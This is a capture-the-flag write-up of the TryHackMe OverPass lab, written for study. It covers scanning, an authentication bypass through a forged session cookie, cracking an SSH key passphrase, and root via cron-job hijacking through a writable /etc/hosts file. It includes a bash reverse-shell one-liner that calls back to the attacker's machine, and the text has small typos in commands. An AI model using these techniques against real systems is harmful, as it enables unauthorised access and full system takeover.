# TryHackMe-OverPass Machine
----------------------------------------------------------------------
## Methodology:
1- Enumeration & Scanning
2- Enumerating HTTP
3- Privilege Escalation
----------------------------------------------------------------------
## 1- Start With Enumeration
#### Scanning the target Machine Using Nmap ==>> `nmap -sC -sV [Target IP]`
```
root@mahmoud:~# nmap -sC -sV 10.10.48.101
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-23 19:12 EET
Nmap scan report for 10.10.48.101
Host is up (0.66s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 107.01 seconds

```
### So Here W found out there Two open ports:
### 1- SSH 22 OpenSSH
### 2- HTTP 80 Golang net/http server
-------------------------------------------------------------------
## Enumerating HTTP
#### Then Let's Brute Force to searching the files on the web server
#### using command ` gobuster dir -u http://10.10.48.101 -w ~/Lists/gobuster/Gobuster-Dir-Medium.txt -t 30`
### The Result:
```
/img                  (Status: 301) [Size: 0] [--> img/]
/downloads            (Status: 301) [Size: 0] [--> downloads/]
/aboutus              (Status: 301) [Size: 0] [--> aboutus/]
/admin                (Status: 301) [Size: 42] [--> /admin/]
/css                  (Status: 301) [Size: 0] [--> css/]
```
-------------------------------------------------------------------

## Let's Open /admin Directory
![Image of mahmoudashraf1344](https://github.com/0x1mahmoud/TryHackMe-Overpass/blob/main/img/THM3.png)
### I have tried the popular credentials... but it's incorrect credentials
### I have opened inspect element to check if there's a js file and i found that there's a 3 js files in debugger
### the login.js is vulnerable...
![Image of mahmoudashraf1344](https://github.com/0x1mahmoud/TryHackMe-Nax/blob/main/img/THM2.png)
### it says that if the response of the authentication request is not “Incorrect Credentials” if the authentication was successful, it then sets the SessionToken to “statusOrCookie”:
### so let's add `cookie: SessionToken=statusOrCookie`
![Image of mahmoudashraf1344](https://github.com/0x1mahmoud/TryHackMe-Overpass/blob/main/img/THM4.png)
### The Result:
![Image of mahmoudashraf1344](https://github.com/0x1mahmoud/TryHackMe-Overpass/blob/main/img/THM5.png)
#### Let's save this ssh key to file like `key` and now we have the username is `james`
#### move forward to using the SSH2John tool to extract the hash from the key
#### First: `root@mahmoud:~# /usr/share/john/ssh2john.py key > hash` ==> I Extract The Hash From key File so i got a "hash" file
#### Second: `root@mahmoud:~# john --wordlist=/usr/share/wordlists/rockyou.txt hash` ==> Now i got the key: james13
#### Note: this is just a key we will login with it via SSH it's not the james password
#### Now we can log in as james via SSH using the private SSH key and the cracked password. ==> `root@mahmoud:~# ssh -i key james@10.10.48.101`
#### after you logged in you will find user.txt it's your first flag :))
----------------------------------------------------------------------------------
## Privilege Escalation
#### 1. Transferring LinPeas using the Python Simple HTTP Server and Wget:
#### 2. Running LinPeas file you transferred to enumerate the machine:==> It means there is a cron job running as root which executes Curl against overpass.thm/dwnloads/src/buildscript.sh
#### 3. overpass.thm is a points at localhost also the /etc/hosts file can be modified by all users so Replacing the overpass.thm entry in /etc/hosts with the local Kali machine’s IP address from 127.0.0.1 to (Kali machine's IP)
#### 4. Creating a Bash script to reverse shell and connect back to the Kali host
#### The Script Code:
```
bash -i >& /dev/tcp/[Your Kali IP]/[PORT] 0>&1

```
#### 5. Then i will Transferring the reverse shell file "buildscript.sh" to the Target Machine
#### 6. let's open the listener by ncat ==> `nact -lnvp [PORT]`
#### 7. the final step run linPeas file again to execute the reverse shell file "buildscript"
#### 8. You will get a root shell to the machine and the second flag in root.txt
-------------------------------------------------------------------------------------------------------
Happy Hack :))
